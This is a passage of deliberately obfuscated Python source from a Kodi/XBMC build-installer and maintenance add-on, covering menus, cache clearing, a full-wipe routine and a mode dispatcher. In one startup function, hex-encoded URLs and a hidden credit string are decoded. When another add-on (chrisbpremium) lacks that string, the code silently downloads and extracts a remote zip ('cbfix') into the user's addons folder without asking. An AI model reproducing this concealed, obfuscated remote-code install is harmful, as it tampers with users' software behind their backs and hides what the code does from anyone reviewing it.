 xbmcgui . Dialog ( ) . ok ( 'Force Refresh Started Successfully' , 'Depending on the speed of your device it could take a few minutes for the update to take effect.' , '' , '[COLOR=blue]For all your XBMC/Kodi support visit[/COLOR] [COLOR=lime][B]www.totalxbmc.tv[/COLOR][/B]' )
 return
 if 98 - 98: i1OOO % II11iII - oO00Oo0o000 % i11iIiiIii + i1OOO - O0oO
 if 97 - 97: oO00Oo0o000 / Ii1iIIIi1ii % oO00Oo0o000 / iiIi * ooOO0o % OoOo
def i1iiii1 ( ) :
 oOO0000 = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f636865636b2e747874'
 Ooo0o0000OO = binascii . unhexlify ( oOO0000 )
 i1iii11 = xbmc . translatePath ( os . path . join ( o0oO0 , Oo0Ooo , 'addon.xml' ) )
 iIiI1II1I1 = xbmc . translatePath ( os . path . join ( o0oO0 , 'plugin.video.chrisbpremium' , 'addon.xml' ) )
 OooiIiI1i1Ii = '68747470733a2f2f69613630313530382e75732e617263686976652e6f72672f362f6974656d732f706c7567696e2e70726f6772616d2e63626669782f706c7567696e2e766964656f2e63626669782e7a6970'
 Oo0o00o = open ( i1iii11 , mode = 'r' )
 oOoOOOo = file . read ( Oo0o00o )
 file . close ( Oo0o00o )
 III1I1 = '5468616e6b7320746f2077687566636c656520666f7220746865206f726967696e616c20436f6d6d756e697479204275696c647320636f6465207573656420696e2074686973206164642d6f6e'
 iI1IIIIII = re . compile ( 'check="1" version="(.+?)"' ) . findall ( oOoOOOo )
 OO0oO0Oo = iI1IIIIII [ 0 ] if ( len ( iI1IIIIII ) > 0 ) else '1.0'
 ooOOoooooo = II1I ( Ooo0o0000OO ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 OoooOO0 = re . compile ( 'version="(.+?)"' ) . findall ( ooOOoooooo )
 oo0OoO = re . compile ( 'url="(.+?)"' ) . findall ( ooOOoooooo )
 iIIi1iii1 = OoooOO0 [ 0 ] if ( len ( OoooOO0 ) > 0 ) else '1.0'
 o00o0OOoOo0O0 = oo0OoO [ 0 ] if ( len ( oo0OoO ) > 0 ) else ''
 if iIIi1iii1 > OO0oO0Oo :
  print "Downloading newer version"
  ooOo . create ( "Installing new version" , "Downloading " , '' , 'Please Wait' )
  downloader . download ( o00o0OOoOo0O0 , OO0oOoo + '/plugin.program.totalinstaller.zip' , ooOo )
  ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
  iIIII1iIIii ( OO0oOoo + '/plugin.program.totalinstaller.zip' , o0oO0 , ooOo )
  time . sleep ( 1 )
 if os . path . exists ( iIiI1II1I1 ) :
  I1o0 = open ( iIiI1II1I1 , mode = 'r' )
  oOoOOOo = file . read ( I1o0 )
  file . close ( I1o0 )
  I1IiiiiI1i1I = binascii . unhexlify ( III1I1 )
  I11i1I1 = binascii . unhexlify ( OooiIiI1i1Ii )
  if not I1IiiiiI1i1I in oOoOOOo :
   downloader . download ( I11i1I1 , OO0oOoo + '/plugin.program.cbfix.zip' )
   iIIII1iIIii ( OO0oOoo + '/plugin.program.cbfix.zip' , o0oO0 )
 ooOooO = OO0o . getSetting ( 'startupvideo' )
 if not os . path . exists ( iiI1IiI ) :
  os . makedirs ( iiI1IiI )
 if not os . path . exists ( i1iiIII111ii ) :
  ooOoO = open ( i1iiIII111ii , mode = 'w+' )
  ooOoO . write ( 'date="01011001"\nversion="0.0"' )
  ooOoO . close ( )
 if not os . path . exists ( ii11iIi1I ) :
  ooOoO = open ( ii11iIi1I , mode = 'w+' )
  ooOoO . write ( 'id="None"\nname="None"' )
  ooOoO . close ( )
 if Oo0O == 'true' :
  ooooIIIiI1iIIII = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f756e6c6f636b65642e747874'
  i1iIi = binascii . unhexlify ( ooooIIIiI1iIIII )
 else :
  o0oo00OOOo = '687474703a2f2f746f74616c78626d632e636f6d2f746f74616c7265766f6c7574696f6e2f76616e696c6c612e747874'
  i1iIi = binascii . unhexlify ( o0oo00OOOo )
 ooOOoooooo = II1I ( i1iIi ) . replace ( '\n' , '' ) . replace ( '\r' , '' )
 oo0oO = re . compile ( 'date="(.+?)"' ) . findall ( ooOOoooooo )
 i1i1IIi = re . compile ( 'video="https://www.youtube.com/watch\?v=(.+?)"' ) . findall ( ooOOoooooo )
 O0OOO0ooO00o = oo0oO [ 0 ] if ( len ( oo0oO ) > 0 ) else ''
 o0oo0Ooo0 = i1i1IIi [ 0 ] if ( len ( i1i1IIi ) > 0 ) else ''
 if 74 - 74: OoO0O00 + Ooo0Oo0 + iiIi
 ooOoO = open ( i1iiIII111ii , mode = 'r' )
 oOoOOOo = file . read ( ooOoO )
 file . close ( ooOoO )
 i11iII1II1I1 = re . compile ( 'date="(.+?)"' ) . findall ( oOoOOOo )
 iIIi1II1 = i11iII1II1I1 [ 0 ] if ( len ( i11iII1II1I1 ) > 0 ) else ''
 OO0Oo = re . compile ( 'version="(.+?)"' ) . findall ( oOoOOOo )
 IIiiiiiIiIIi = OO0Oo [ 0 ] if ( len ( OO0Oo ) > 0 ) else ''
 O0OOo = open ( ii11iIi1I , mode = 'r' )
 i1I1Iiii1 = file . read ( O0OOo )
 file . close ( O0OOo )
 IiI1I11ii = re . compile ( 'id="(.+?)"' ) . findall ( i1I1Iiii1 )
 oO0 = IiI1I11ii [ 0 ] if ( len ( IiI1I11ii ) > 0 ) else 'None'
 ii1I = re . compile ( 'name="(.+?)"' ) . findall ( i1I1Iiii1 )
 o0OOoOoO00 = ii1I [ 0 ] if ( len ( ii1I ) > 0 ) else ''
 if int ( iIIi1II1 ) < int ( O0OOO0ooO00o ) and ooOooO == 'true' :
  ii1II1II = oOoOOOo . replace ( iIIi1II1 , O0OOO0ooO00o )
  OOO000000OOO0 = open ( i1iiIII111ii , mode = 'w' )
  OOO000000OOO0 . write ( str ( ii1II1II ) )
  OOO000000OOO0 . close ( )
  yt . PlayVideo ( o0oo0Ooo0 , forcePlayer = True )
  xbmc . sleep ( 500 )
  while xbmc . Player ( ) . isPlaying ( ) :
   xbmc . sleep ( 500 )
 Ii1i ( o0OOoOoO00 , IIiiiiiIiIIi , oO0 )
 if 89 - 89: O0oO - Iii1i1I11I * O0oO + Iii1i1I11I
 if 94 - 94: I1i1iii / o0oO * o0oO + oO00Oo0o000 - oO00Oo0o000 % iii11I111
def ii1i ( ) :
 I1iI1 = os . path . join ( xbmc . translatePath ( 'special://home' ) , 'cache' )
 if os . path . exists ( I1iI1 ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( I1iI1 ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     try :
      os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
     except :
      pass
    for OooOo00o in IiIi1ii111i1 :
     try :
      shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     except :
      pass
 if xbmc . getCondVisibility ( 'system.platform.ATV2' ) :
  i111iIi1i1 = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'Other' )
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( i111iIi1i1 ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
  OOo00O0O = os . path . join ( '/private/var/mobile/Library/Caches/AppleTV/Video/' , 'LocalAndRental' )
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( OOo00O0O ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 65 - 65: Ii1iIIIi1ii . ooOO0o / OoO0O00
 iI11ii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.module.simple.downloader' ) , '' )
 if os . path . exists ( iI11ii ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( iI11ii ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 65 - 65: O0oO
 iiI11 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.image.music.slideshow/cache' ) , '' )
 if os . path . exists ( iiI11 ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( iiI11 ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 57 - 57: Ii1iIIIi1ii % o0oO / iiiIi1i1I + I1i1iii
 oOOo00ooO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.iplayer/iplayer_http_cache' ) , '' )
 if os . path . exists ( oOOo00ooO ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( oOOo00ooO ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 64 - 64: o0oO
 I111I = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.itv/Images' ) , '' )
 if os . path . exists ( I111I ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( I111I ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 62 - 62: Iii1i1I11I + O0oO
 iIiIi1i1Iiii = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/script.navi-x/cache' ) , '' )
 if os . path . exists ( iIiIi1i1Iiii ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( iIiIi1i1Iiii ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 78 - 78: iiiIi1i1I - i1OOO + ooOO0o * OoO0O00 * iii11I111
 iIiiiII11 = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.phstreams/Cache' ) , '' )
 if os . path . exists ( iIiiiII11 ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( iIiiiII11 ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 98 - 98: Ooo0Oo0
 i1Ii1IiIIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.audio.ramfm/cache' ) , '' )
 if os . path . exists ( i1Ii1IiIIi ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( i1Ii1IiIIi ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 20 - 20: i1OOO . O0OOO - Ooo0Oo0 / OoOo - iii11I111
 oooooOoOO = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.whatthefurk/cache' ) , '' )
 if os . path . exists ( oooooOoOO ) == True :
  for Ii1IIii , IiIi1ii111i1 , i1i1i1I in os . walk ( oooooOoOO ) :
   II1Ii = 0
   II1Ii += len ( i1i1i1I )
   if II1Ii > 0 :
    for IiI11i1IIiiI in i1i1i1I :
     os . unlink ( os . path . join ( Ii1IIii , IiI11i1IIiiI ) )
    for OooOo00o in IiIi1ii111i1 :
     shutil . rmtree ( os . path . join ( Ii1IIii , OooOo00o ) )
     if 59 - 59: O0oO . Iii1i1I11I % OOO00OoOO00 % i11iIiiIii + OOO00OoOO00 % OoOo
 try :
  I1i1iiIi = os . path . join ( xbmc . translatePath ( 'special://profile/addon_data/plugin.video.genesis' ) , 'cache.db' )
  OOo0OOOoOOo = database . connect ( I1i1iiIi )
  III = OOo0OOOoOOo . cursor ( )
  III . execute ( "DROP TABLE IF EXISTS rel_list" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
  III . execute ( "DROP TABLE IF EXISTS rel_lib" )
  III . execute ( "VACUUM" )
  OOo0OOOoOOo . commit ( )
 except :
  pass
  if 45 - 45: OoOo * oO00Oo0o000 / Iii1i1I11I + II11iII . i1OOO / II11iII
  if 64 - 64: OoO0O00 / o0oO % iiIi - iii11I111
def iIii111Ii ( ) :
 oooO0 = xbmc . translatePath ( os . path . join ( oO , 'Community Builds' , 'My Builds' ) )
 iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( "ABSOLUTELY CERTAIN?!!!" , 'Are you absolutely certain you want to wipe?' , '' , 'All addons and settings will be completely wiped!' , yeslabel = 'Yes' , nolabel = 'No' )
 if iIII1I1i1i == 1 :
  if iIii1 != "skin.confluence" :
   IiI . ok ( '[COLOR=blue][B]T[/COLOR][COLOR=dodgerblue]R[/COLOR] [COLOR=white]Community Builds[/COLOR][/B]' , 'Please switch to the default Confluence skin' , 'before performing a wipe.' , '' )
   xbmc . executebuiltin ( "ActivateWindow(appearancesettings)" )
   return
  else :
   iIII1I1i1i = xbmcgui . Dialog ( ) . yesno ( "VERY IMPORTANT" , 'This will completely wipe your install.' , 'Would you like to create a backup before proceeding?' , '' , yeslabel = 'No' , nolabel = 'Yes' )
   if iIII1I1i1i == 0 :
    if not os . path . exists ( oooO0 ) :
     os . makedirs ( oooO0 )
    iI = O0O00OOo ( heading = "Enter a name for this backup" )
    if ( not iI ) : return False , 0
    OoOOo = urllib . quote_plus ( iI )
    iii1 = xbmc . translatePath ( os . path . join ( oooO0 , OoOOo + '.zip' ) )
    oOO0oo = [ 'plugin.program.totalinstaller' , 'service.TBS.update' 'plugin.program.TBS' ]
    II1iIi1IiIii = [ "xbmc.log" , "xbmc.old.log" , "kodi.log" , "kodi.old.log" , '.DS_Store' , '.setup_complete' , 'XBMCHelper.conf' ]
    O0i1i1II1i11 = "Creating full backup of existing build"
    iI111I11i = "Archiving..."
    I1 = ""
    II1i11I1 = "Please Wait"
    OOOO00OO0O0 ( Oo , iii1 , O0i1i1II1i11 , iI111I11i , I1 , II1i11I1 , oOO0oo , II1iIi1IiIii )
    II11IiI1 ( )
    O00o0O0oo = xbmc . translatePath ( os . path . join ( o0oO0 , Oo0Ooo , '' ) )
    iIIII1I1I1 = xbmc . translatePath ( os . path . join ( Oo , '..' , 'TI.zip' ) )
    Ii1iI111 ( O00o0O0oo , iIIII1I1I1 )
    O0IIi1i = xbmc . translatePath ( os . path . join ( o0oO0 , 'script.module.addon.common' , '' ) )
    oO0o = xbmc . translatePath ( os . path . join ( Oo , '..' , 'TIdep.zip' ) )
    Ii1iI111 ( O0IIi1i , oO0o )
    try :
     i1I1iI1 = xbmc . translatePath ( os . path . join ( o0oO0 , 'service.TBS.update' , '' ) )
     oOOoOiii1i1Iiiiiii = xbmc . translatePath ( os . path . join ( Oo , '..' , 'TIserv.zip' ) )
     Ii1iI111 ( O0IIi1i , oO0o )
    except : pass
    OOoo0 = xbmc . translatePath ( os . path . join ( i1i1II , 'plugin.program.totalinstaller' , '' ) )
    Ii11I1iIIi = xbmc . translatePath ( os . path . join ( Oo , '..' , 'TIdata.zip' ) )
    Ii1iI111 ( OOoo0 , Ii11I1iIIi )
    I1o0o0OoOOOOOo ( Oo )
    if not os . path . exists ( O00o0O0oo ) :
     os . makedirs ( O00o0O0oo )
    if not os . path . exists ( O0IIi1i ) :
     os . makedirs ( O0IIi1i )
    if not os . path . exists ( i1I1iI1 ) :
     os . makedirs ( i1I1iI1 )
    if not os . path . exists ( OOoo0 ) :
     os . makedirs ( OOoo0 )
    time . sleep ( 1 )
    O00o0O ( iIIII1I1I1 )
    ooOo . create ( "Restoring Total Installer add-on" , "Checking " , '' , 'Please Wait' )
    ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
    iIIII1iIIii ( iIIII1I1I1 , O00o0O0oo , ooOo )
    O00o0O ( oO0o )
    iIIII1iIIii ( oO0o , O0IIi1i , ooOo )
    ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
    O00o0O ( oOOoOiii1i1Iiiiiii )
    iIIII1iIIii ( oOOoOiii1i1Iiiiiii , i1I1iI1 , ooOo )
    ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
    O00o0O ( Ii11I1iIIi )
    iIIII1iIIii ( Ii11I1iIIi , OOoo0 , ooOo )
    ooOo . update ( 0 , "" , "Extracting Zip Please Wait" )
    ooOo . close ( )
    time . sleep ( 1 )
    iiIiiIi1 ( )
   else : return
   if 68 - 68: Oo000o / Ii1iIIIi1ii . iiiIi1i1I + i11iIiiIii + iii11I111
   if 92 - 92: II11iII . iii11I111 . OoO0O00 % OoOo
def OO00O00o0O ( ) :
 Ii ( '' , 'Clear Cache' , 'url' , 'clear_cache' , 'Clear_Cache.png' , '' , '' , '' )
 Ii ( '' , 'Clear My Cached Artwork' , 'none' , 'remove_textures' , 'Delete_Cached_Artwork.png' , '' , '' , '' )
 Ii ( '' , 'Delete Addon_Data' , 'url' , 'remove_addon_data' , 'Delete_Addon_Data.png' , '' , '' , '' )
 Ii ( '' , 'Delete Old Builds/Zips From Device' , 'url' , 'remove_build' , 'Delete_Builds.png' , '' , '' , '' )
 Ii ( '' , 'Delete Old Crash Logs' , 'url' , 'remove_crash_logs' , 'Delete_Crash_Logs.png' , '' , '' , '' )
 Ii ( '' , 'Delete Packages Folder' , 'url' , 'remove_packages' , 'Delete_Packages.png' , '' , '' , '' )
 Ii ( '' , 'Wipe My Install (Fresh Start)' , 'none' , 'wipe_xbmc' , 'Fresh_Start.png' , '' , '' , '' )
 if 100 - 100: II11iII % OoOo / Oo000o * O0OOO - OOO00OoOO00
 if 34 - 34: ooOO0o % i11iIiiIii + i11iIiiIii - ooOO0o
def iii1iII ( url ) :
 Ii ( 'folder' , '[COLOR=yellow]1. Install[/COLOR]' , str ( url ) + '&tags=Install&XBMC=1' , 'grab_tutorials' , 'Install.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=lime]2. Settings[/COLOR]' , str ( url ) + '&tags=Settings' , 'grab_tutorials' , 'Settings.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=orange]3. Add-ons[/COLOR]' , str ( url ) , 'tutorial_addon_menu' , 'Addons.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Audio' , str ( url ) + '&tags=Audio' , 'grab_tutorials' , 'Audio.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Errors' , str ( url ) + '&tags=Errors' , 'grab_tutorials' , 'Errors.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Gaming' , str ( url ) + '&tags=Gaming' , 'grab_tutorials' , 'gaming_portal.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  LiveTV' , str ( url ) + '&tags=LiveTV' , 'grab_tutorials' , 'LiveTV.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Maintenance' , str ( url ) + '&tags=Maintenance' , 'grab_tutorials' , 'Maintenance.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Pictures' , str ( url ) + '&tags=Pictures' , 'grab_tutorials' , 'Pictures.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Profiles' , str ( url ) + '&tags=Profiles' , 'grab_tutorials' , 'Profiles.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Skins' , str ( url ) + '&tags=Skins' , 'grab_tutorials' , 'Skin.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Video' , str ( url ) + '&tags=Video' , 'grab_tutorials' , 'Video.png' , '' , '' , '' )
 Ii ( 'folder' , '[COLOR=dodgerblue][XBMC/Kodi][/COLOR]  Weather' , str ( url ) + '&tags=Weather' , 'grab_tutorials' , 'Weather.png' , '' , '' , '' )
 if 77 - 77: O0oO + Iii1i1I11I * o0oO % Iii1i1I11I
 if 3 - 3: OoO0O00 * oO00Oo0o000 - iiIi / o0oO
def ii1iIi1 ( url ) :
 oO00oO = xbmc . getInfoLabel ( "System.BuildVersion" )
 IIIIiiIiiI = float ( oO00oO [ : 4 ] )
 if IIIIiiIiiI < 14 :
  II11II = 'You are running XBMC'
 else :
  II11II = 'You are running Kodi'
 IiI = xbmcgui . Dialog ( )
 IiI . ok ( II11II , "Your version is: %s" % IIIIiiIiiI )
 if 40 - 40: ooOO0o + O0OOO
 if 18 - 18: Ii1iIIIi1ii % Ii1iIIIi1ii % OOO00OoOO00 + iiIi % oO00Oo0o000 / OoO0O00
i1IiI1I111iIi = o00OoooooooOo ( )
iiIiii1IIIII = None
i1iiIIIi = None
ii1iIIiii1 = None
Oo0o = None
iIioO00O0o0oOOO = None
oooOo00O0 = None
IIIII1 = None
iIIIII11 = None
iii11i1IIII = None
I11IIIi = None
i1i1iII1 = None
ooOOoooooo = None
I11I1IIiiII1 = None
OO0OO00ooO0 = None
ooooOoo00 = None
ooooooo00o = None
ooooOOO0 = None
ooOo0O0o0 = None
o00o = None
iIIiiI1II1i11 = None
IIIIii1111i1 = None
i1i1ii1111i1i = None
I1iiIII = None
OoOOo = None
i11II1I11I1 = None
OOOOOoO00oo00 = None
o0O0OO0o = None
IIIIiiIiiI = None
oO00o0 = None
iIiI = None
Oo0oOooOooO = None
iiI1ii1 = None
if 34 - 34: O0oO . i11iIiiIii * Ooo0Oo0 + Iii1i1I11I - O0oO . O0OOO
try : iiIiii1IIIII = urllib . unquote_plus ( i1IiI1I111iIi [ "addon_id" ] )
except : pass
try : iIi1I1 = urllib . unquote_plus ( i1IiI1I111iIi [ "adult" ] )
except : pass
try : i1iiIIIi = urllib . unquote_plus ( i1IiI1I111iIi [ "artpack" ] )
except : pass
try : ii1iIIiii1 = urllib . unquote_plus ( i1IiI1I111iIi [ "audioaddons" ] )
except : pass
try : Oo0o = urllib . unquote_plus ( i1IiI1I111iIi [ "author" ] )
except : pass
try : iIioO00O0o0oOOO = urllib . unquote_plus ( i1IiI1I111iIi [ "buildname" ] )
except : pass
try : oooOo00O0 = urllib . unquote_plus ( i1IiI1I111iIi [ "data_path" ] )
except : pass
try : IIIII1 = urllib . unquote_plus ( i1IiI1I111iIi [ "description" ] )
except : pass
try : iIIIII11 = urllib . unquote_plus ( i1IiI1I111iIi [ "email" ] )
except : pass
try : iii11i1IIII = urllib . unquote_plus ( i1IiI1I111iIi [ "fanart" ] )
except : pass
try : I11IIIi = urllib . unquote_plus ( i1IiI1I111iIi [ "forum" ] )
except : pass
try : O0oOoo0OoO0O = urllib . unquote_plus ( i1IiI1I111iIi [ "guisettingslink" ] )
except : pass
try : i1i1iII1 = urllib . unquote_plus ( i1IiI1I111iIi [ "iconimage" ] )
except : pass
try : ooOOoooooo = urllib . unquote_plus ( i1IiI1I111iIi [ "link" ] )
except : pass
try : I11I1IIiiII1 = urllib . unquote_plus ( i1IiI1I111iIi [ "local" ] )
except : pass
try : OO0OO00ooO0 = urllib . unquote_plus ( i1IiI1I111iIi [ "messages" ] )
except : pass
try : ooooOoo00 = str ( i1IiI1I111iIi [ "mode" ] )
except : pass
try : ooooooo00o = urllib . unquote_plus ( i1IiI1I111iIi [ "name" ] )
except : pass
try : o0oo0O = urllib . unquote_plus ( i1IiI1I111iIi [ "pictureaddons" ] )
except : pass
try : ooooOOO0 = urllib . unquote_plus ( i1IiI1I111iIi [ "posts" ] )
except : pass
try : ooOo0O0o0 = urllib . unquote_plus ( i1IiI1I111iIi [ "programaddons" ] )
except : pass
try : o00o = urllib . unquote_plus ( i1IiI1I111iIi [ "provider_name" ] )
except : pass
try : IIIIii1111i1 = urllib . unquote_plus ( i1IiI1I111iIi [ "repo_link" ] )
except : pass
try : iIIiiI1II1i11 = urllib . unquote_plus ( i1IiI1I111iIi [ "repo_id" ] )
except : pass
try : i1i1ii1111i1i = urllib . unquote_plus ( i1IiI1I111iIi [ "skins" ] )
except : pass
try : I1iiIII = urllib . unquote_plus ( i1IiI1I111iIi [ "sources" ] )
except : pass
try : OoOOo = urllib . unquote_plus ( i1IiI1I111iIi [ "title" ] )
except : pass
try : i11II1I11I1 = urllib . unquote_plus ( i1IiI1I111iIi [ "updated" ] )
except : pass
try : OOOOOoO00oo00 = urllib . unquote_plus ( i1IiI1I111iIi [ "unread" ] )
except : pass
try : o0O0OO0o = urllib . unquote_plus ( i1IiI1I111iIi [ "url" ] )
except : pass
try : IIIIiiIiiI = urllib . unquote_plus ( i1IiI1I111iIi [ "version" ] )
except : pass
try : oO00o0 = urllib . unquote_plus ( i1IiI1I111iIi [ "video" ] )
except : pass
try : iIiI = urllib . unquote_plus ( i1IiI1I111iIi [ "videoaddons" ] )
except : pass
try : Oo0oOooOooO = urllib . unquote_plus ( i1IiI1I111iIi [ "welcometext" ] )
except : pass
try : iiI1ii1 = urllib . unquote_plus ( i1IiI1I111iIi [ "zip_link" ] )
except : pass
if 99 - 99: OoOo
if ooooOoo00 == None and Oo0O == 'true' : i1iiii1 ( )
elif ooooOoo00 == None : oOOIi1II ( '' , '' , '' , '' )
elif ooooOoo00 == 'addon_final_menu' : o0oOIIiIi1iI ( o0O0OO0o )
elif ooooOoo00 == 'addon_categories' : oOiIi1IIIi1 ( )
elif ooooOoo00 == 'addon_countries' : IIIIiiII111 ( )
elif ooooOoo00 == 'addon_genres' : IIiooO0oOo0o ( )
elif ooooOoo00 == 'addon_install' : Ii1 ( ooooooo00o , iiI1ii1 , IIIIii1111i1 , iIIiiI1II1i11 , iiIiii1IIIII , o00o , I11IIIi , oooOo00O0 )
elif ooooOoo00 == 'addon_removal_menu' : Iiiiii111i1ii ( )
elif ooooOoo00 == 'addonfix' : IiIi1iI11 ( )
elif ooooOoo00 == 'addonfixes' : i1II ( )
elif ooooOoo00 == 'addonmenu' : O00oOo00o0o ( o0O0OO0o )
elif ooooOoo00 == 'addon_settings' : Iiii ( )
elif ooooOoo00 == 'backup' : BACKUP ( )
elif ooooOoo00 == 'backup_option' : I1I1i1I ( )
elif ooooOoo00 == 'backup_restore' : IioO0oOOO0Ooo ( )
elif ooooOoo00 == 'categories' : oOOIi1II ( )
elif ooooOoo00 == 'check_storage' : III1I1Ii11iI ( )
elif ooooOoo00 == 'clear_cache' : i1ii11 ( )
elif ooooOoo00 == 'community' : O0o ( o0O0OO0o )
elif ooooOoo00 == 'community_backup' : O0ooOo0o0Oo ( )
elif ooooOoo00 == 'community_menu' : OOO0o0OO0OO ( o0O0OO0o , oO00o0 )
elif ooooOoo00 == 'countries' : iIIiiIIi1IiI ( o0O0OO0o )
elif ooooOoo00 == 'description' : OO0OoOo0OOO ( ooooooo00o , o0O0OO0o , iIioO00O0o0oOOO , Oo0o , IIIIiiIiiI , IIIII1 , i11II1I11I1 , i1i1ii1111i1i , iIiI , ii1iIIiii1 , ooOo0O0o0 , o0oo0O , I1iiIII , iIi1I1 )
elif ooooOoo00 == 'fix_special' : i1I1 ( o0O0OO0o )
elif ooooOoo00 == 'genres' : o0OO ( o0O0OO0o )
elif ooooOoo00 == 'gotham' : OOO0oOO0ooo0 ( )
elif ooooOoo00 == 'grab_addons' : oOOO0ooo ( o0O0OO0o )
elif ooooOoo00 == 'grab_builds' : ooOoooo0 ( o0O0OO0o )
elif ooooOoo00 == 'grab_builds_premium' : Grab_Builds_Premium ( o0O0OO0o )
elif ooooOoo00 == 'grab_hardware' : i1ooOoo000oO ( o0O0OO0o )
elif ooooOoo00 == 'grab_news' : III1II1i ( o0O0OO0o )
elif ooooOoo00 == 'grab_tutorials' : Ii1Ii1I ( o0O0OO0o )
elif ooooOoo00 == 'guisettingsfix' : ooooo0Oo0 ( o0O0OO0o , I11I1IIiiII1 )
elif ooooOoo00 == 'hardware_filter_menu' : IIIII ( o0O0OO0o )
